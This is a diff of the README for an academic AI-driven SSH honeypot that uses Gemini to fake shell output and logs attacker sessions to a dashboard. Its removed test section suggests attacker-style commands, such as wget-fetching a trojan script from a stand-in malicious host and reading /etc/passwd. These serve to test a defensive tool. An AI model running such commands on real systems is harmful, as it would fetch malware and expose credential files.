@@ -1,97 +1,82 @@
-# AdaptiveWardens: AI-Driven Adaptive Honeypot
+# 🛡️ AdaptiveWardens: AI-Driven Adaptive Honeypot
 
-An AI-powered honeypot that simulates a realistic compromised corporate SSH server. Attackers interact with a fully sandboxed environment where unknown commands are handled by Google Gemini in real-time, producing consistent and believable responses. All sessions, commands, and indicators of compromise are logged and visualized on a live dashboard.
+AdaptiveWardens is an AI-powered honeypot that simulates a realistic, compromised Ubuntu server. By leveraging **Google Gemini**, it generates consistent and believable responses to unknown attacker commands while logging all activity for analysis on a real-time dashboard.
 
 ---
 
 ## 🚀 Quick Start
 
-### 1. Clone the repository
-
+### 1. Clone & Enter
 ```bash
 git clone https://github.com/Aligithyb/-AdaptiveWardens.git
 cd AdaptiveWardens
 ```
 
-### 2. Set up environment variables
+### 2. Configure Environment
+You only need **one** `.env` file in the root directory. This file manages all services.
 
-You need two `.env` files:
-
-**Root `.env`** (for Docker Compose to pick up the Gemini key):
 ```bash
-cat > .env << 'EOF'
-GEMINI_API_KEY=your_gemini_api_key_here
-EOF
+# Copy the example to start
+cp .env.example .env
 ```
 
-**AI Engine `.env`** (used directly by the AI service):
-```bash
-cat > ai-engine/.env << 'EOF'
-GEMINI_API_KEY=your_gemini_api_key_here
-SANDBOX_URL=http://sandbox-store:8001
-EOF
-```
+**Required Keys:**
+- **Gemini API Key**: Get it at [ai.studio.google.com](https://aistudio.google.com/app/apikey).
+- **Slack Configuration**: See the [Slack Setup](#-slack-alerts-setup) section below.
 
-> Get your free Gemini API key at: https://aistudio.google.com/app/apikey
-
-### 3. Start everything
-
+### 3. Launch
 ```bash
 ./start.sh
-```
-
-### 4. Access the dashboard
-
-```bash
-open http://localhost:3000
-```
-
-### 5. Test the honeypot
-
-```bash
-ssh root@localhost -p 2222
-# Try any password — it accepts everything
-# Then try: wget http://malicious.com/trojan.sh
-# Or: cat /etc/passwd
-# Or: echo "hello"
 ```
 
 ---
 
 ## 🏗️ Architecture
 
+```mermaid
+graph TD
+    A[Attacker] -->|SSH port 2222| B[SSH Honeypot]
+    B -->|Known Commands| C[(Sandbox Store)]
+    B -->|Unknown Commands| D[AI Engine]
+    D -->|Prompt| E[Google Gemini]
+    E -->|Response| D
+    D -->|Cache| D
+    C -->|Real-time Data| F[SOC Dashboard]
 ```
-Attacker
-   │
-   ▼
-SSH Honeypot (port 2222)
-   │
-   ├── Static commands (whoami, ls, cat) ──► Sandbox Store (SQLite DB)
-   │
-   └── Unknown commands ──► AI Engine (Gemini) ──► Realistic response
-                                    │
-                                    └── Response cached for consistency
-   │
-   ▼
-Sandbox Store (port 8001)
-   │  Logs all sessions, commands, files, processes
-   │
-   ▼
-Dashboard (port 3000)
-   │  Live sessions, IOC summary, MITRE ATT&CK mapping,
-   │  session playback, metrics
-```
-
----
-
-## 📦 Services
 
 | Service | Port | Description |
 |---|---|---|
-| `ssh-frontend` | 2222 | SSH honeypot — accepts all logins |
-| `sandbox-store` | 8001 | SQLite API — stores sessions, commands, filesystem |
-| `ai-engine` | 8002 | Gemini-powered shell response generator |
-| `dashboard-frontend` | 3000 | Next.js real-time SOC dashboard |
+| `ssh-frontend` | 2222 | The honeypot entry point (Accepts any login). |
+| `ai-engine` | 8002 | Generates realistic shell output via Gemini. |
+| `sandbox-store` | 8001 | Centralized API for session state & logs. |
+| `dashboard` | 3000 | Next.js interface for monitoring attacks. |
+
+---
+
+## 📢 Slack Alerts Setup
+
+AdaptiveWardens can notify you instantly when a new session starts.
+
+### 1. Create a Slack App
+1. Go to [api.slack.com/apps](https://api.slack.com/apps).
+2. Click **Create New App** > **From Scratch**.
+3. Name it "AdaptiveWarden" and select your Workspace.
+
+### 2. Configure Incoming Webhooks (Recommended)
+1. Select **Incoming Webhooks** in the sidebar.
+2. Toggle it to **On**.
+3. Click **Add New Webhook to Workspace** and select a channel.
+4. Copy the **Webhook URL** and add it to your `.env`:
+   ```env
+   SLACK_WEBHOOK_URL=https://hooks.slack.com/services/...
+   ```
+
+### 3. Alternative: Bot Token
+If you prefer using a Bot Token, ensure you add the `chat:write` scope under **OAuth & Permissions**, install the app, and fill:
+```env
+SLACK_BOT_TOKEN=xoxb-...
+SLACK_CHANNEL=#your-channel
+```
 
 ---
 
@@ -155,44 +140,31 @@ docker-compose up -d
 
 ## 📁 Project Structure
 
-```
+```text
 AdaptiveWardens/
-├── ssh-frontend/          # SSH honeypot server (Python + asyncssh)
-│   ├── src/ssh_server.py
-│   ├── requirements.txt
-│   └── Dockerfile
-├── sandbox-store/         # Database API (FastAPI + SQLite)
-│   ├── src/api.py
-│   ├── schemas/
-│   ├── requirements.txt
-│   └── Dockerfile
-├── ai-engine/             # Gemini AI response engine (FastAPI)
-│   ├── src/
-│   │   ├── api.py
-│   │   ├── llm_provider.py
-│   │   └── response_cache.py
-│   ├── requirements.txt
-│   └── Dockerfile
-├── dashboard-frontend/    # SOC Dashboard (Next.js + Tailwind)
-│   ├── src/
-│   │   ├── app/
-│   │   └── components/
-│   └── Dockerfile
-├── docker-compose.yml
-├── start.sh
-├── stop.sh
-└── .env                   # ← You create this (not committed)
+├── .env                   <-- Your centralized configuration
+├── docker-compose.yml     <-- Orchestrates all services
+├── ssh-frontend/          <-- SSH Honeypot (Python + AsyncSSH)
+├── ai-engine/             <-- Gemini Response Engine (FastAPI)
+├── sandbox-store/         <-- Central API & SQLite Database
+├── dashboard-frontend/    # SOC Dashboard (Next.js)
+└── start.sh               # Easy launch script
 ```
 
 ---
 
 ## ⚠️ Important Notes
 
-- **Never commit your `.env` files** — they contain your API key
-- The honeypot is sandboxed — no real commands execute on your machine
-- The SSH server accepts any username and password by design
-- Gemini responses are cached for 5 minutes to ensure consistency
-- The `honeypot-internal` Docker network has no internet access by design — only the AI engine and dashboard are allowed outbound access
+- **Sandboxed**: No real commands execute on your host machine.
+- **Internal Network**: The honeypot services are isolated in an internal Docker network without internet access (except for the AI engine to call Gemini).
+- **Academic Project**: Developed for the Fall 2025 cohort.
+- **SSH Access**: The honeypot accepts any username/password combination on port 2222.
+- **Consistency**: Gemini responses are cached for 5 minutes to ensure a believable attacker experience.
+
+--- 
+
+## 📄 License
+MIT License. See [LICENSE](LICENSE) for details.
 
 ---
 
